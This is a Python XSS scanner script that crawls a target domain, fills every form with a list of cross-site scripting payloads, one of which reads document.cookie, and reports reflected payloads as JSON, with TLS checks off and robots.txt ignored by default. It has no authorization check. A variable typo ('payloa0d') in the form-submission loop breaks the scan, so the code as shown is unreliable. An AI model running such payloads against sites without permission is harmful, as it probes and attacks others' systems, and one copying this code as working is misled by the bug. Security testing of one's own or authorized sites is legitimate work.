import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import sys
import json
import warnings
from typing import List, Dict, Set
import argparse # Keep argparse temporarily for structure, but won't use its results directly

# Suppress SSL warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# List of XSS payloads
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    "'><svg/onload=alert(1)>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
]

# Global variables to store results
crawled_links = set()
vulnerabilities_found: List[Dict] = []
scanned_urls_internal: Set[str] = set() # To track scanned URLs internally

# --- Helper Functions (Keep original logic, just adapt errors/output) ---

def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    try:
        response = requests.get(url, verify=False, timeout=10) # Added verify=False and timeout
        if response.status_code != 200:
            return []
        soup = bs(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"Error retrieving forms from {url}: {str(e)}", file=sys.stderr)
        return []

def get_form_details(form):
    """This function extracts all possible useful information about an HTML `form`"""
    # Keep original logic
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    # Extracting input details within the form
    for input_tag in form.find_all(["input", "textarea", "select"]): # Include textarea and select
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "") # Get default value
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """Submits a form given in `form_details` with payload `value`"""
    # Keep original logic
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input_detail in inputs:
        input_name = input_detail.get("name")
        input_type = input_detail.get("type", "text")
        input_value = input_detail.get("value", "")
        if not input_name: continue
        if input_type in ["text", "search", "textarea", "email", "url", "password"]:
             data[input_name] = value
        else:
             data[input_name] = input_value
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, verify=False, timeout=10) # Added verify=False and timeout
        else:
            return requests.get(target_url, params=data, verify=False, timeout=10) # Added verify=False and timeout
    except requests.exceptions.RequestException as e:
        print(f"Error submitting form to {target_url}: {str(e)}", file=sys.stderr)
        return None

def get_all_links(url):
    """Given a `url`, it returns all links from the HTML content"""
    # Keep original logic
    try:
        response = requests.get(url, verify=False, timeout=10) # Added verify=False and timeout
        if response.status_code != 200:
            return []
        soup = bs(response.content, "html.parser")
        links = []
        for a_tag in soup.find_all("a", href=True):
             href = a_tag.attrs.get("href")
             if href: links.append(urljoin(url, href))
        return links
    except requests.exceptions.RequestException as e:
        print(f"Error retrieving links from {url}: {str(e)}", file=sys.stderr)
        return []

# --- Main Scanning Function (Adapt output, keep logic) ---

def scan_xss(url_to_scan: str, target_domain: str, max_links_limit: int, obey_robots: bool):
    """
    Scans a given URL for XSS vulnerabilities and optionally crawls links.
    Reports results by appending to the global vulnerabilities_found list.
    """
    global crawled_links
    global vulnerabilities_found
    global scanned_urls_internal # Use internal set for recursion control

    # Normalize URL to avoid duplicates with fragments (#)
    normalized_url = urljoin(url_to_scan, urlparse(url_to_scan).path)

    # Use internal scanned set for recursion check
    if normalized_url in scanned_urls_internal:
        return
    scanned_urls_internal.add(normalized_url)

    # Add to the global set for final count
    crawled_links.add(normalized_url)

    # --- Robots.txt Check (Keep original logic) ---
    crawl_allowed = True # Default to allowed
    if obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(target_domain, "/robots.txt"))
        try:
            robot_parser.read()
            crawl_allowed = robot_parser.can_fetch("*", url_to_scan)
        except Exception as e:
            print(f"Error reading robots.txt file for {target_domain}: {str(e)}", file=sys.stderr)
            crawl_allowed = False # Assume disallowed if error reading

    if not crawl_allowed:
         print(f"Skipping {url_to_scan} due to robots.txt", file=sys.stderr)
         return # Stop processing this URL

    # --- Form Scanning (Keep original logic, change output) ---
    forms = get_all_forms(url_to_scan)
    #print(f"[+] Detected {len(forms)} forms on {url_to_scan}", file=sys.stderr) # Debug info to stderr

    for form in forms:
        form_details = get_form_details(form)
        form_vulnerable_found_in_this_scan = False
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url_to_scan, payloa0d)
            # Check response carefully
            response_text = ""
            if response and response.content:
                try:
                    response.encoding = response.apparent_encoding
                    response_text = response.text
                except UnicodeDecodeError:
                    response_text = response.content.decode('utf-8', errors='ignore')

            if response_text and payload in response_text:
                # Append vulnerability details instead of printing
                vulnerability_data = {
                    'type': 'Cross-Site Scripting (XSS)',
                    'url': url_to_scan, # Use the URL where the form was found
                    'form_action': form_details.get("action", "N/A"),
                    'form_method': form_details.get("method", "N/A"),
                    'payload': payload
                }
                # Avoid adding duplicates
                if vulnerability_data not in vulnerabilities_found:
                    vulnerabilities_found.append(vulnerability_data)
                form_vulnerable_found_in_this_scan = True
                break # Move to next form once vulnerability found

    # --- Crawling (Keep original logic) ---
    # Only crawl if enabled (will simulate via max_links_limit > 0 or default depth)
    # Add a depth limit to prevent infinite loops even without explicit crawl flag
    current_depth = url_to_scan.count('/') - target_domain.count('/') # Simple depth estimate
    MAX_RECURSION_DEPTH = 3 # Hard limit for safety

    if current_depth < MAX_RECURSION_DEPTH:
        links = get_all_links(url_to_scan)
        for link in set(links): # Use set to avoid crawling same link multiple times from one page
            link_domain = urlparse(link).netloc
            # Stay within the target domain
            if link_domain == urlparse(target_domain).netloc:
                # Check max links limit if provided
                if max_links_limit > 0 and len(crawled_links) >= max_links_limit:
                    #print(f"[-] Maximum links ({max_links_limit}) limit reached.", file=sys.stderr)
                    continue # Stop crawling new links but finish current scans
                # Recursively scan the link
                scan_xss(link, target_domain, max_links_limit, obey_robots)

# --- Main execution block (Adapt for server input) ---

if __name__ == "__main__":
    if len(sys.argv) != 2:
        # Output error as JSON
        print(json.dumps({"error": "URL argument is missing"}))
        sys.exit(1)

    target_url = sys.argv[1]
    # Ensure target URL has a scheme
    if not urlparse(target_url).scheme:
         target_url = "http://" + target_url # Default to http

    parsed_target = urlparse(target_url)
    target_domain = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # Simulate argparse defaults (crawl=True, max_links=0 (no limit), obey_robots=False)
    # We will control crawling depth via recursion limit instead of explicit flag
    max_links_to_crawl = 0 # Simulate no limit, rely on depth limit
    should_obey_robots = False

    # Start the scan
    try:
        scan_xss(target_url, target_domain, max_links_to_crawl, should_obey_robots)
    except Exception as e:
         print(f"Main scan error during execution: {str(e)}", file=sys.stderr)
         # Still try to output any results found so far
    finally:
         # --- Final JSON Output ---
         output = {
             "target": target_url,
             "urls_scanned": len(crawled_links),
             "vulnerabilities": vulnerabilities_found
         }
         # Print the entire report as a single JSON string
         print(json.dumps(output, indent=2))

